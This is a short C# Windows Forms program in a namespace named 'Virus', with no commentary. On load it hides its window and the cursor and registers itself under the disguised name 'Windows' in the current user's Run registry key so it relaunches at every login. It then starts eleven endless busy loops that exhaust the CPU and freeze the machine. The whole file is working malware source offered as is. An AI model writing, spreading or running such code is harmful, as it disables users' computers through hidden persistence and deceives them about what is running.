using System;
using System.Windows.Forms;
using Microsoft.Win32;
using System.Threading;

namespace Virus
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            this.ShowInTaskbar = false;
            RegistryKey rk = Registry.CurrentUser.OpenSubKey
            ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            rk.SetValue("Windows", Application.ExecutablePath);
            Cursor.Hide();
            this.WindowState = FormWindowState.Minimized;
            for (int i = 0; i < 10; i++)
            {
                ThreadPool.QueueUserWorkItem(new WaitCallback((a) =>
                {
                    while (true) { }
                }));
            }
            while (true) { }
        }
    }
}
